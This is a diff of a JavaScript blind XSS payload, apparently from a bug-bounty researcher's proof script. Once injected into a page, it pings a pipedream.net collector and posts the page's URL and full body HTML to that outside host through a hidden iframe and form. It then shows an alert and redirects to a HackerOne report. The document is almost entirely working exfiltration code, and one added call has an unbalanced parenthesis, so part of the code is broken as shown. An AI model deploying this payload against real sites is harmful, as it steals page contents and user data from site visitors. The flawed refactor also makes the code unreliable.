@@ -4,7 +4,7 @@ elem.src = 'https://encq9kzbey4y.x.pipedream.net/BLIND_XSS_TRIGGERED';
 document.body.appendChild(elem);
   
   //https://stackoverflow.com/a/6169703
-  function Exfil(name, data) {
+  function Exfil(f) {
   // Add the iframe with a unique name
   var iframe = document.createElement("iframe");
   var uniqueString = "CHANGE_THIS_TO_SOME_UNIQUE_STRING";
@@ -18,24 +18,32 @@ document.body.appendChild(elem);
   form.action = "https://encq9kzbey4y.x.pipedream.net/exfil";
   form.method = "POST";
 
-  // repeat for each parameter
-  var input = document.createElement("input");
-  input.type = "hidden";
-  input.name = name;
-  input.value = data;
-  form.appendChild(input);
-
+  f(form);
   document.body.appendChild(form);
   form.submit();
   }
   
-  Exfil("location", document.location.href);
-  Exfil("html_code", document.body.innerHTML);
+  Exfil(function(form){
+   var input = document.createElement("input");
+  input.type = "hidden";
+  input.name = "location";
+  input.value = document.location.href;
+  form.appendChild(input);
+  });
+  Exfil((function(form){
+   var input = document.createElement("input");
+  input.type = "hidden";
+  input.name = "html_code";
+  input.value = document.body.innerHTML;
+  form.appendChild(input);
+  });
   
 }catch(error) {  
 }
 
 try {
+  setTimeout(function(){
 alert('PROOF -> Blind XSS HIT. This is proof from 0-1@HackerOne. Please contact your security team.');
 document.location.href = "https://hackerone.com/reports/693776";
+  }, 1500);
 }catch(error) {}
